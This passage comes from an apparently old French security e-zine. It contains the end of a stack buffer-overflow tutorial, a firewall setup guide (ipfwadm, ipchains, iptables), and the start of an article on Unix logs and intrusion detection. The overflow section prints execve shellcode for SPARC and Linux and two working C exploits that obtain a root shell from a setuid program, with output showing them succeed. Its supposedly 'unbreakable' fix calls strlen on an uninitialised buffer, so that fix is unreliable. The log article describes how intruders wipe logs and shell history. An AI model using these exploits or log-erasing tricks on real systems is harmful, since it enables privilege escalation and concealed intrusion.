+
+
+SPARC/SunOS  -
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+	  mov     -0x1, %l5
+        ta      %l5 + 1
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      %l5 + 1
+
+Shellcode correspondant :
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+
+
+V) Ecriture de l'exploit
+
+Une fois tous les paramètres réunis, c'est à dire le shell-
+-code, la position de %eip et l'adresse du buffer, il est 
+très facile d'écrire l'exploit.
+
+Pour le programme vul.c, voici ce qu'il pourrait donner :
+------------------------------------------------------------------
+/* exploit.c */
+#include <stdio.h>
+#define OFFSET 132
+
+/* Shellcode pour Linux/i386 */
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+main()
+   {
+   int i, j;
+
+   /* La chaine servant à overwriter %eip */
+   char chaine[OFFSET+4];
+
+   /* Copie les x90 dans la chaine */
+   for(i=0;i<(OFFSET-sizeof(shellcode));i++) chaine[i] = 0x90;
+
+   /* Copie le shellcode dans la chaine */
+   for(i=i,j=0;i<OFFSET;i++,j++) chaine[i] = shellcode[j];
+
+   /* Adresse du buffer : 0xbffffd68 */
+   chaine[i++] = 0x68;
+   chaine[i++] = 0xfd;
+   chaine[i++] = 0xff;
+   chaine[i++] = 0xbf;
+
+   /* Placement de la chaine dans une variable d'environnement */
+   memcpy(chaine,"EGG=",4);  
+   putenv(chaine);
+   }
+------------------------------------------------------------------
+
+On va maintenant tester notre exploit:
+$ gcc exploit.c -o exploit
+$ ./exploit
+$ ./vul $EGG
+Segmentation fault.
+# echo ;)
+bash: syntax error near unexpected token `;)'
+
+Ca marche donc plutôt bien. La chaîne servant a overflooder 
+le buffer et y faire pointer notre fausse adresse de retour 
+a été placée, par l'exploit, dans la variable d'environnement 
+$EGG. On a ensuite utilisé cette dernière sur le programme 
+vulnérable pour ainsi obtenir un interpréteur de commandes 
+racine (moyennant la présence du bit suid root sur vul).
+
+
+[ Une autre manière d'exploiter les buffer overflow ]
+
+Nous pourrions aussi penser a créer un programme générique 
+permettant d'exploiter les buffer overflow, pour cela nous 
+pourrons prendre en compte la taille de la chaîne d'overflood 
+(généralement elle sera 100 octets plus grands que la taille
+du buffer a overwriter) et une adresse de buffer. 
+
+En fait, les adresses de buffer allouées par les progra-
+-mmes ne varient seulement que de quelques centaines, voir 
+milliers d'octet. Il serait donc possible de déterminer à 
+quelle adresse commence la pile et essayer de trouver un 
+offset pour atteindre le début du buffer vulnérable. La 
+récupération de cette adresse s'effectuerait en récupérant 
+le contenu du registre %esp, qui pointe vers le haut de la 
+pile souvenez vous. L'opération est très simple, on déplace 
+le contenu de %esp dans celui du registre accumulateur %eax:
+
+
+unsigned long getsp(void) {
+   __asm__("movl %esp,%eax");
+}
+ 
+
+Un appel a getsp() récupérera l'adresse ou commence la 
+stack, donc pour trouver l'adresse du buffer vulnérable, 
+on utilisera une adresse telle que addr = getsp() - offset, 
+ou offset est le déplacement en octets à effectuer depuis 
+le début de la pile jusqu'au buffer.
+
+Voilà maintenant à quoi ressemblera l'exploit:
+------------------------------------------------------------------
+/* exploit.c */
+#include <stdio.h>
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET 0
+#define NOP 0x90
+
+/* Shellcode pour Linux/i386 */
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long getsp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) 
+   {
+   char *buff, *ptr;
+   long *addr_ptr, addr;
+   int bsize, offset=DEFAULT_OFFSET;
+   int i;
+
+   /* Récupération des arguments passés au programmes */
+   if(argc < 2)
+      {
+      fprintf(stderr, "usage: %s -taille- -offset\n", argv[0]);
+      exit(-1);
+      }
+   bsize = atoi(argv[1]);
+   if(!argv[2]) offset = atoi(argv[2]);
+
+   if (!(buff = malloc(bsize))) 
+      {
+      fprintf(stderr, "Allocation mémoire impossible\n");
+      exit(-1);
+      }
+
+   addr = getsp() - offset;
+   printf("\nAdresse du buffer à exploiter: 0x%x\n", addr);
+   printf("Taille de la chaîne d'overflood: %d\n", bsize);
+
+   ptr = buff;
+   addr_ptr = (long *) ptr;
+   for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr;
+
+   /* Copie les nops dans la chaîne d'overflood */
+   for (i = 0; i < bsize/2; i++) buff[i] = NOP;
+
+   /* Copie le shellcode dans la chaîne d'overflood */
+   ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+   for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];
+
+   buff[bsize - 1] = '\0';
+
+   /* Placement de la chaîne dans la variable d'environnement $EGG */
+   memcpy(buff,"EGG=",4);
+   putenv(buff);
+   system("/bin/bash");
+   }
+------------------------------------------------------------------
+
+Et si on testait ? Généralement on prendra comme adresse de 
+notre chaîne d'overflood une taille environ plus grande de 
+100 octets que celle du buffer que nous voulons exploiter. 
+Egalement, si vous vous trompez sur l'offset, cela n'aura 
+peut être pas de conséquence étant donner que si, au moment 
+de retourner, le programme vulnérable tombe au milieu de 
+notre shellcode, vu les nops placés avant celui-ci, le code 
+qui suit devrait tout de même être executé. Voici maintenant 
+un nouvel exemple d'exploitation de vul.c, :
+
+
+$ gcc bof.c -o bof
+$ ./bof
+usage: ./bof -taille- -offset
+$ ./bof 100 100
+Adresse du buffer à exploier: 0xbffffdc4
+Taille de la chaîne d'overflood: 100
+$ ./vul $EGG
+Segmentation fault
+$ exit
+$ ./bof 228 
+Adresse du buffer à exploiter: 0xbffffd68
+Taille de la chaîne d'overflood: 228
+$ ./vul $EGG
+# echo ;)
+bash: syntax error near unexpected token `;)'
+
+
+Nous avons construit, en fonction des arguments donnés par 
+l'utilisateur,une chaîne qui nous servira à overflooder no-
+-tre buffer vulnérable. Cette chaîne a été placée dans une 
+variable d'environnement, qui nous a servi d'argument pour 
+le programme faillible. Résultat: %eip pointe sur notre 
+shellcode, ce dernier est executé, et on obtient un shell 
+root... L'exploit pourra bien entendu nous servir dans 
+d'autres cas de figures, cependant nous nous limiterons 
+à cet exemple.
+
+
+[ Se protéger des buffer overflow ]
+
+En effet, comme nous l'avons vu un exploit pour buffer over-
+-flow est simple à coder, et encore plus simple à faire fonc-
+-tionner... Tous vos programmes peuvent être sensibles à ce 
+type d'exploit, à partir du moment ou vous utiliser des fonc-
+-tions sensibles, strcpy(), strcat, gets(), etc... Ces erreurs 
+de programmation peuvent être corrigées gràace à l'utilisation 
+de fonctions équivalentes plus sécurisées, telles que strncpy, 
+ainsi que l'utilisation conjointe des fonctions dynamiques 
+d'allocations mémoires que sont free(), malloc(), realloc(), 
+etc... Nous allons donc reprendre dans ce chapitre le 
+programme vul.c afin d'en coder son équivalent sécurisé !
+
+Voici à quoi ressemble vul.c :
+------------------------------------------------------------------
+/* vul.c */
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[])
+{
+char buffer[128];
+strcpy(buffer, argv[1]);
+}
+------------------------------------------------------------------
+
+Et voilà à quoi pourrait ressembler son équivalent sécurisé :
+------------------------------------------------------------------
+/* invul.c */
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+char buffer[128];
+char *ptr;
+
+if (argc < 2)
+{
+exit(0);
+}
+
+ptr = malloc(strlen(buffer) + 1);
+if (ptr == NULL)
+{
+exit(1);
+}
+
+else {
+strncpy(ptr, argv[1], 127);
+free(ptr);
+}
+exit(0);
+}
+------------------------------------------------------------------
+Certes, c'est beaucoup plus long que le programme précédent 
+mais ce type de code reste inviolable. Il faut souffrir pour 
+être sécurisé... Autre chose encore : N'utilisez jamais la 
+fonction gets(), d'ailleurs au moment de la compilation vous 
+recevrez un avertissement, cette fonction est certainement la
+plus dangeurese de toutes, vous risquez de vous faire hacker 
+en deux trois mouvements si vous l'utilisez... Certes, je n'ai 
+pas à influencer vos méthodes de programmation ni à vous dic-
+-ter ce que vous devez et ce que vous ne devez pas faire mais 
+prenez garde à vos programmes...
+
+
+
+[-EOF]
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------
+V.: MISE EN PLACE D'UN FIREWALL                   Par groslameur
+------------------------------------------------------------------
+
+Vous qui vous croyez à l'abri derrière votre pc, êtes vous 
+vraiment sûr d'être intouchables ? Vous pensez l'être, jus-
+qu'au jour où un pirate malveillant parvient à infiltrer 
+votre serveur ftp, un wu-ftp pourtant tout neuf, place un
+cheval de troies malicieux et vous fait redemarrer, afin 
+de l'activer, par ce que l'on apelle plus communément une 
+attaque de refus de service, un Dos.
+
+Cette situation peut être la votre... Nul n'est à l'abri 
+sur Internet, de millions d'utilisateurs, des pirates po-
+-tentiels, sondent le réseau à la recherche de serveurs, 
+et si ils en trouvent un sensible, ils n'hésiteront pas à 
+le mettre en pièce. Ce qui peut à tout moment vous arriver. 
+Cet article n'a pas pour ambition de vous apprendre à sécu-
+riser parfaitement votre réseau, mais de vous apprendre co-
+-mment installer et configurer un firewall.
+
+Firewall ? En français, "mur de feu", un firewall est tout 
+simplement un service qui a pour but de protéger vos machi-
+-nes du monde extérieur, une sorte de muraille. Nous nous 
+intéresserons ici plus particulièrement aux firewall linux 
+inclus dans le kernel (utilisant une technologie de filtre 
+de paquets). Il existe d'autres types de firewall, un des 
+plus connus et des plus employés est le proxy, servant à se 
+connecter derrière une machine.
+
+Il existe deux grandes politiques concernant les firewall, 
+en effet soit :
+- Tout ce qui n'est pas expréssement autorisé est interdit.
+Ou soit :
+- Tout ce qui n'est pas expréssement interdit est autorisé.
+
+Nous verrons par la suite comment mettre en place une de ces 
+deux méthodes, pour l'instant, analysont de plus près qu'est 
+ce qu'un firewall...
+
+
+[ Configuration basique ]
+
+Un firewall est installé par coutume, sur un poste n'offrant 
+aucun service, donc isolé de vos serveurs. Une règle d'or en 
+sécurité réseau consiste par ailleurs à installer le moins 
+de services possibles par machine, de sorte à limiter les 
+dégats. Soit. 
+
+Il existe plusieurs architectures de firewall, la plus simple 
+à comprendre est celle ci :
+
+
+`--------------'     _______      ---------        --------
+|   Internet   | ---[routeur]--- | Firewal | ---- { Réseau }
+`--------------'     -------      ---------        --------
+
+
+Ceci étant la configuration la plus basique, le firewall sur-
+-veille et bloque les données malsaintes acheminées depuis 
+Internet par le routeur, le réseau quand à lui, peut être un 
+ensemble de serveurs ou un intranet.
+
+
+[ Le Bastion Host ]
+
+Passons donc à une autre configuration, faisant cette fois ci 
+intervenir ce que l'on apelle hôte de défiance, "Bastion Host" 
+en anglais. L'hôte de défiance est en réalité une machine di-
+-rectement exposé aux attaques, c'est à dire en dehors du ré-
+-seau interne et du pare-feu. Dans le cas précédent, le fire-
+-wall faisait office de machine Bastion. Mais une machine Bas-
+-tion peut aussi être un serveur, Web, ftp ou dns.
+
+Le shéma suivant illustre l'utilisation d'un hôte de défiance :
+
+
+`----------'    _______
+| Internet |---[routeur]---           ---------      ---------
+`----------'    -------    |         | Firewal |----( Réseau  )
+                           |          ---------      ---------
+                           |             |
+                      --------------     |
+                     ( Bastion Host )----
+                      --------------
+
+
+Dans cet exemple, l'hôte de défiance est exposé aux attaques 
+venant d'Internet. C'est pour ça que les services qu'ils off-
+-rent doivent être convenablement sécurisés. Le firewall, 
+quand à lui, se charge de mettre hors de danger un réseau privé.
+
+
+[ Double firewall ]
+
+Il existe également une autre configuration basée sur cette 
+architecture, dans le cas de la mise en place de deux firewall. 
+
+Cela donnera ça :
+
+
+    _______     ----------                ---------      --------
+---[routeur]---| Firewall |              | Firewal |----( Réseau )
+    -------     ----------                ---------      --------
+                    |                        |
+                    |     --------------     |
+                     ----( Bastion Host )----
+                          --------------
+
+
+Dans ce shéma, nous constatons la présence d'un autre fire-
+-wall, externe, chargé d'assurer la sécurité de l'hôte de 
+défiance, qui je le rapelle peut représenter un ou plusieurs 
+serveurs offrant des services tels que ftp, http, etc... 
+A part cela, la configuration est la même, on retrouve tou-
+-jours un firewall interne chargé de protéger un réseau privé.
+
+
+[ La zone démilitarisée ]
+
+Passons maintenant à une dernière configuration, la zone dé-
+-militarisée (DMZ). La DMZ est une zone rassemblant les ma-
+-chines Bastions (Web, FTP, DNS, Mail,etc), et les isolant 
+ainsi du réseau interne.
+Voici un rapide shéma illustrant cela :
+
+
+`--------------'     _______      ---------       --------
+|   Internet   | ---|routeur|--- | Firewal | --- ( Réseau )
+`--------------'     -------      ---------       --------
+                                       |
+                                       |
+                                   #''''''''''#
+                                   |   DMZ    |
+                                   |(Serveurs)|
+                                   #''''''''''#
+
+Comme nous pouvons le voir, le firewall isole la DMZ, regrou-
+-pant les machines publiques, du réseau interne. Cette confi-
+-guration est l'une des plus courantes. Cependant disposer 
+d'une DMZ ne vous rend pas invulnérable...
+
+
+
+[ Préparation avant mise en place ]
+
+Avant de mettre en place un firewall, il faut d'abord s'assu-
+-rer que l'option permettant de le configurer a été bien acti-
+vée dans le noyau. Si oui, passez ce chapitre, si non, je vous 
+propose de recompiler votre kernel !
+
+Voyons comment faire... Direction --> /usr/src commençons 
+d'abord par décompresser et décompacter les sources du kernel :
+
+
+[root@localhost:/usr/src] $ gzip -cd kernel-source* | tar xfv -
+[root@localhost:/usr/src] $ cd kernel-source*
+
+
+Copions maintenant le fichier de configuration du kernel dans 
+le repertoire courant, en le renommant en .config (fichier ca-
+-ché), puis activons le menu de configuration du noyau :
+
+
+[root@localhost:kernel-source*] $ cp /boot/config-* .config
+[root@localhost:kernel-source*] $ make xconfig (ou make config 
+pour le mode console ou encore make menuconfig)
+
+
+Allez maintenant dans Networking options et cochez les op-
+-tions suivantes :
+
+
+- Network firewalls
+- TCP/IP networking
+- IP: firewalling
+- IP: firewall packet logging
+
+
+Sauvegardez les modifications et revenez en mode console 
+pour commencer la compilation du nouveau noyau :
+
+
+[root@localhost:/usr/src/kernel-source*] $ make dep
+[root@localhost:/usr/src/kernel-source*] $ make clean
+[root@localhost:/usr/src/kernel-source*] $ make modules
+[root@localhost:/usr/src/kernel-source*] $ make modules install
+
+
+Ceci fait, il ne vous reste plus qu'a créer une image com-
+-pressée du kernel et de la faire prendre compte au démarrage :
+
+
+[root@localhost:/usr/src/kernel-source*] $ make bzImage
+[root@localhost:/usr/src/kernel-source*] $ cp arch/i386/boot/bzImage
+/boot/vmlinuz.x.xa
+
+
+[root@localhost:kernel-source*] $ vi /etc/lilo.conf
+
+On édite maintenant le fichier lilo.conf, appuyez sur la touche 
+Inser et créez un nouveau label du style :
+
+
+image=/boot/vmlinuz.x.xa
+label=firewall
+
+
+Appuyez ensuite sur Echap puis tapez ":wq". Il nous reste 
+maintenant à enregistrer nos modifications dans lilo.conf :
+
+
+[root@localhost:kernel-source] $ lilo
+
+
+Il ne vous reste maintenant plus qu'à redemarrer, à l'écran 
+de lilo, tapez "firewall" et appuyez sur entrée. Le nou-
+-veau noyau se lancera donc, intégrant les options de confi-
+-guration du firewall.
+
+
+
+[ Configuration du firewall ]
+
+Mettez vous maintenant en mode console. Il existe trois 
+grandes commandes pour les firewall : ipfwadm, ipchains et 
+iptables. Personellement j'ai configuré mon firewall avec 
+ipchains, mais nous allons voir plus en détail chacune de
+toutes ces commandes...
+
+
+a) Configuration avec ipfwadm
+
+Ipfwadm est l'adaption linux du firewall ipfw qui équipe les 
+*BSD. Si il est l'un des premiers firewall kernel, il n'est 
+cependant pas le meilleur, et son utilisation ne permet pas 
+d'accomplir certaines tâches. 
+Cependant nous allons l'étudier de plus près...  Voici sa 
+syntaxe :
+
+
+# ipfwadm -categorie -commande -parametres [options]
+
+
+Les catégories disponibles sont :
+-F : indique une liste de règles de forwading.
+-I : indique une liste de règles d'input (ACCEPT).
+-O : indique une liste de règles d'output (ACCEPT).
+-M : pour l'ip masquerading.
+
+Les commandes disponibles sont :
+-f : sert à remettre à zéro toutes les règles établies.
+-a : ajoute une règle à la fin de la liste sélectionnée, 
+cette option est suivie de la politique à employer pour 
+la règle, deny (refuser) ou accept (accepter) sont les 
+plus courantes. Par exemple un "-a accept" indiquera que 
+tous les paquets correspondant à la règle défini seront 
+acceptés.
+-i : ajoute une règle au début de la liste selectionnée, 
+suivie de la politique à employer pour cette règle.
+-d : efface une règle.
+-l : affiche toutes les règles de la liste sélectionnée.
+-p : indique la politique par défaut à suivre pour une 
+liste de règles, cela peut être soit accept (accepter), 
+deny (refuser), reject (rejetter), ou redir (rediriger). 
+Si un paquet entrant n'est pas conforme aux règles 
+établies, il obéira à la politique par défaut.
+-h : demande de l'aide sur la syntaxe d'une commande.
+
+Les paramètres disponibles sont :
+-P : indique le protocole à employer, tcp, udp, icmp 
+ou all.
+-S : indique l'adresse source, en général celle des 
+attaquants potentiels pour une politique de type deny, 
+et la votre pour une politique de type accept. L'adresse 
+à indiquer peut être une adresse IP comme un nom d'hôte. 
+Cete adresse est suivie du nombre de bytes devant 
+correspondre (généralement 24). L'adresse est suivie 
+d'un numéro de port (qui sera le numéro de port source).
+Le caractère ":" permet de donner une fourchette de port. 
+Par exemple, 6000:6063 indiquera tous les ports de 6000 
+à 6063.
+-D : indique l'adresse cible, qui devrait être la votre ou 
+celle de votre réseau pour une politique de type deny, ou 
+celle d'une machine extérieure pour une politique de type 
+accept. Tout comme l'adresse source, l'adresse de destination 
+est suivie du nombre de bytes devant correspondre. L'adresse 
+est suivie d'un numéro de port (qui sera le numéro de port 
+de destination).
+-V : spécifie un nom d'interface par laquelle vont transiter 
+les paquets, par exemple eth0 ou eth1.
+
+Les options disponibles sont :
+-b : indique un mode bidirectionnel pour une règle, en 
+d'autres termes cette option ajoutera l'inverse d'une règle, 
+et cette règle en elle même à la liste.
+-n : indique que les adresses ip et les numéros de ports 
+seront affichés au format numérique. 
+-r : indique une redirection des paquets vers une socket,
+on doit donc spécifier à cette option un numéro de port.
+-v : sert à afficher des informations détaillées sur les 
+règles ajoutées, supprimées ou modifiées.
+
+Cette liste de catégories, de commandes, de paramètres et 
+d'options n'est malheuresement pas exhaustive, j'ai enlevé 
+les quelques options que je jugeais inutiles. Maintenant 
+voyons quelques exemples d'utilisation de ipfwadm.
+
+Exemple : Nous désirons établir une règle empéchant les 
+attaques de type smurf. Je ne reviendrais pas sur l'expli-
+-cation de ce type d'attaques, sachez simplement que nous 
+configurerons notre firewall de manière à refuser les paquets 
+icmp de type echo (port icmp 7). Nous supposerons un réseau de 
+classe C, dont l'adresse est 192.168.13.0 :
+
+$ ipfwadm -F -f
+$ ipfwadm -F -p accept
+$ ipfwadm -a deny -P icmp -S 0/0 7 -D 192.168.13.0/24
+
+A la première ligne nous avons formaté le contenu de la liste 
+de règles de forwading. Nous l'avons redéfini en lui attribuant 
+une politique par défaut de type accept, c'est à dire que tous 
+les paquets entrant ne répondant pas aux règles définies seront 
+acceptés. A la dernière ligne, nous avons configuré le firewall 
+de telle sorte à ce qu'il refuse toute tentative de connexion 
+sur le port icmp 7 (echo) sur notre réseau. Le 0/0 que nous avons
+mis pour l'adresse source correspond à toute adresse IP existante.
+
+
+b) Configuration avec ipchains
+
+Ipchains est reputé pour être un outil convivial, bien plus facile 
+d'accès qu'un ipfwadm par exemple. Voici sa syntaxe :
+
+
+# ipchains -commande chaine -parametres [options]
+
+
+Les commandes disponibles sont :
+-A : ajoute une règle à la fin de toutes les règles existantes.
+-D : efface une règle.
+-R : remplace une règle dans la chaîne selectionée.
+-I : insère une règle au début de la chaîne.
+-L : liste toutes les règles d'une chaîne selectionée.
+-F : remet la chaîne selectionée à zéro.
+-P : indique la politique par défaut d'une chaîne, si les 
+paquets entrants ne correspondent pas aux règles établies. 
+Ces politiques sont ACCEPT, REJECT ou REDIR. Cette dernière 
+politique sera utilisée si nous désirons rediriger un packet 
+vers une socket distante.
+-h : demande de l'aide sur la syntaxe d'une commande.
+
+Les paramètres disponibles sont :
+-p : indique le protocole à utiliser pour la règle. Cela peut 
+être soit tcp, soit udp, soit icmp, ou soit all (tout).
+-s : indique l'adresse source, ainsi que le nombre de bytes 
+à prendre en compte (voir ipfwadm). Elle est suivie du numéro 
+de port source. On peut également indiquer une fourchette de 
+ports, exemple pour 0:65535, dans ce cas tous les ports serons 
+pris en compte.
+-d : indique l'adresse de destination, même chose que pour 
+l'adresse source, on peut la faire suivre d'un numéro de port 
+(qui sera le port de destination).
+-i : spécifie une interface par laquelle vont transiter les 
+paquets, par exemple eth0 ou eth1.
+-j : indique la politique à suivre pour la règle selectionnée, 
+si elle correspond au paquet entrant, cela peut être soit DENY, 
+ACCEPT, REJECT ou REDIR. Nous ne reviendrons pas sur REDIR.
+
+Les options disponibles sont :
+-b : indique un mode bidirectionnel pour une règle, en 
+d'autres termes cette option ajoutera l'inverse d'une règle, et 
+cette règle en elle même à la liste.
+-n : indique que les adresses ip et les numéros de ports seront 
+affichés au format numérique.
+-r : indique une redirection des paquets vers une socket, on doit 
+donc spécifier à cette option un numéro de port.
+-v : sert à afficher des informations détaillées sur les règles 
+ajoutées, supprimées ou modifiées.
+
+Voici maintenant un exemple de l'utilisation d'ipchains. Notre 
+adresse réseau sera le même que tout à l'heure : Nous souhaitons 
+interdire l'ip spoofing sur notre réseau, nous devrons donc 
+interdire les paquets dont l'adresse source est la même que 
+celle de notre réseau.
+
+
+$ ipchains -F forward
+$ ipchains -P forward ACCEPT
+$ ipchains -A forward -s 192.168.13.0/24 -i eth+ -p tcp -j DENY
+
+
+Nous avons donc crée une nouvelle chaîne, forward, et défini 
+une politique par défaut de type ACCEPT, ce qui signifie que 
+tous les paquets ne correspondant pas aux règles établies 
+seront acceptées. Notre dernière règle est donc celle qui nous 
+protégera de l'ip spoofing. Elle rejette tous les paquets tcp 
+ayant pour adresse source celle de notre réseau, cette règle 
+s'applique pour toutes les cartes ethernet, en effet le plus 
+devant le eth symbolise que toutes les  interfaces commençant 
+par "eth" seront prises en charge.
+
+
+c) Configuration avec iptables
+
+Iptables est sans doute le firewall kernel le plus populaire, 
+de plus il est entièrement compatible avec ipchains et ipfwadm. 
+Sa syntaxe est la suivante :
+
+
+# iptables -commande chaine -paramètres --extensions [options]
+
+
+Les commandes disponibles sont :
+-A : ajoute une règle à la fin de la chaîne selectionnée.
+-I : insére une règle au début de la chaîne selectionnée.
+-D : supprime une règle.
+-R : remplace une règle.
+-L : affiche toutes les règles d'une chaîne.
+-F : remet une chaîne à zéro.
+-N : crée une nouvelle chaîne.
+-P : indique la politique par défaut d'une chaîne, ACCEPT, DROP 
+(équivalent de REJECT), QUEUE ou REDIR.
+
+Les paramètres disponibles sont :
+-p : spécifie le protocole à utiliser, tcp, udp, icmp ou all.
+-s : spécifie l'adresse source, avec le nombre de byte à prendre 
+en compte.
+-d : spéicifie l'adresse de destination, avec le nombre de bytes.
+-i : spécifie l'interface à utiliser pour la règle.
+-o : spécifie l'interface sur laquelle le paquet va être transféré.
+-j : spécifie la politique à prendre en compte quand le paquet 
+entrant correspond à la règle définie. Soit ACCEPT, DENY, REJECT 
+ou REDIR.
+
+Les extensions (à utiliser avec les paramètres -m protocole et 
+-p protocole) :
+--sport : défini le port source qu'un paquet doit utiliser pour 
+correspondre à la règle définie. (un "!" devant le port le rend 
+inutilisable)
+--dport : défini le port de destination qu'un paquet soit util-
+-iser pour correspondre à la règle définie. (un "!" devant le 
+port le rend inutilisable).
+--tcp : il s'agit d'une extension tcp uniquement. Elle indique 
+le flag que doit avoir le paquet pour correspondre à la règle, 
+cela peut être SYN, ACK, RST, FIN, URG, PSH, etc...
+
+Et voici pour clore, un exemple d'utilisation de iptables. Nous 
+souhaitons par exemple bloquer l'accès au service finger, dont 
+le port est 79, par un firewall. Nous utiliserons comme adresse
+de réseau 192.168.13.0
+
+
+$ iptables -F forward
+$ iptables -P forward ACCEPT
+$ iptables -A forward  -p tcp -s 0/0 --sport 79 -d 192.168.13.0/24 -j DROP
+
+
+Ces commandes ne sont pas vraiment compliquées à comprendre et 
+ne méritent pas d'explication. A noter qu'à la place de bloquer 
+le port 79 par un firewall, on aurait pu tout simplement désac-
+-tiver le service en utilisant le démon inetd. Mais ceci est une 
+autre histoire...
+
+
+
+[-EOF]
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------
+VI.: SECURITE SOUS *NIX && IDS                  Par groslameur
+---------------------------------------------------------------
+
+
+[ Le systeme de logs sous unix ]
+
+Un log est en fait un fichier qui enregistre toute activité
+sur un système en veille, sur un système Unix, on pourrait 
+répartir les fichiers logs en trois grandes catégories: 
+
+a) les logs gérés par le démon syslogd, son fichier de confi-
+-guration est /etc/syslog.conf, il contient l'endroit ou se-
+-ront entreposés des logs relatifs aux messages du noyau 
+(généralement /var/log). Et voici la structure de ce fichier:
+
+type.priorité          chemin_de_destination
+
+Le type définit l'émetteur du message, en général cela sera 
+KERN pour les messages du noyau, USER pour les messages émis 
+par les utilisateurs ou les processus hors système. Il existe 
+plusieurs autres types, DAEMON pour les messages émis par 
+d'autres démons, AUTH pour les messages émis par des comman-
+-des d'authentification (pour la suite, "man syslogd").
+
+La priorité définit la priorité du message, EMERG (0), pour 
+un éventuel plantage du système, ALERT (1) pour une erreur 
+jugée grave par le système, CRIT (2), pour une erreur devant 
+être corrigée, ERR (3) pour des messages d'erreurs sans gra-
+-vité, WARNING (4) pour des avertissements d'éventuelles err-
+-eurs, NOTICE (5), pour des remarques concernant un mauvais 
+fonctionnement du système, INFO (6), pour des messages d'in-
+-formations, ou DEBUG (7) pour le débogage de programmes.
+
+Le chemin de destination est tout simplement le chemin ou 
+sera placé le fichier log (certainement dans un des sous 
+repertoires de /var/log). A noter que le fichier /etc/syslog.
+conf peut très bien contenir des caractères génériques tels 
+que "*" ou "?".
+
+Ces logs sont donc consultables à travers des fichiers, pour 
+les lires faites donc un petit "less" ou "more" pour les plus 
+puristes d'entre vous...
+
+b) les logs gérés par le système d'exploitation, c'est a dire 
+wtmp, utmp et lastlog. Les commandes pour afficher ces logs 
+sont "last" (wtmp) pour regarder les dernières connexions/dé-
+-connexions au système, "w" (utmp) pour regarder les connex-
+-ions actives sur le système et enfin "lastlog" (lastlog) pour
+consulter un historique des dernières deconnexions.
+
+c) Les logs gérés par l'utilisateur, plus souvent apellés les 
+historiques, en fait un fichier garde des traces de votre pas-
+-sage, c'est à dire la liste de toutes les commandes que vous 
+avez tapé sur le shell d'un utilisateur.
+Ce fichier est stocké dans le repertoire de cet utilisateur, 
+il s'agit de ~/.bash_history, qui contient la liste de toutes 
+les dernières commandes effectuées (sur un shell bash en l'occ-
+-urence). 
+
+
+2 - Indécelables intrusions...
+
+Cependant, si un pirate jouit des droits root sur votre système 
+et si il a un minimum de cervelle, il pensera à modifier ou a 
+corrompre ces fichiers logs (que je n'entende pas de "rm -r 
+/var/log" !) Pour un pirate, les opérations courantes seront 
+de rediriger les fichiers logs gérés par le démon syslog vers 
+/dev/null, d'effacer les traces de connexion en faisant un r-
+-login sur le système cible, d'effacer les historiques du shell 
+à la déconnexion (echo "rm .history" > .logout ; echo "rm .logout" 
+>> .logout), voir de changer la date et l'heure des fichiers modi-
+-fiés. Si cette dernière opération n'a pas été mise en oeuvre, 
+une simple commande vous permettra de vous montrer les derniers 
+éléments modifiés:
+
+
+$ find / -ctime 0
+
+
+Bon, le résultat dépendera de l'habilité du pirate... Autre point 
+à surveiller: les lkms (linux kernel modules). Expliquer ce qu'est 
+un lkm nécessiterait d'abord de comprendre le fonctionnement géné-
+-ral du système d'exploitation linux. En fait, ce système se 
+décompose en plusieurs partie: Le noyau, qui est le coeur princi-
+-pal, celui-ci va gérer les périphériques, les processus, etc... 
+Mais aussi les lkms, ou modules, ceux-ci peuvent réaliser des tâ-
+-ches indépendantes (ou non) du noyau. Un module que vous connai-
+-ssez et que vous utiliser sûrement est l'interpréteur de comman-
+-des (shell), qui permet d'offrir l'interface utilisateur simple, 
+puissante et conviviale que nous connaissons tous. Le problème 
+(si cela en est un), c'est que les lkms peuvent tout faire. De ce 
+fait, j'ai deux nouvelles à vous annoncer, une bonne et une mau-
+vaise...
+
+La bonne est que vous pouvez facilement lister et supprimer les 
+modules présents sur votre système, et cela au moyen des comm-
+-andes "lsmod" et "rmmod".
+La mauvaise est que certains lkms détournent des syscall pour 
+pouvoir se cacher sur le système, et même un lsmod ne vous 
+permettra pas de voir qu'un vil lkm utilise vos syscall pour 
+dissimuler une bien grosse backdoor root dans votre système 
+de fichiers...
+
+
+[ Les systèmes de détection d'intrusion (IDS) ]
+
+Après avoir observé de plus de près la facilité qu'à un pirate 
+à se cacher sur votre machine, on pourrait penser à établir un 
+système qui nous permettrait de nous alerter en cas de tentative 
+ou de compromission. C'est le rôle des IDS, ce sont des outils 
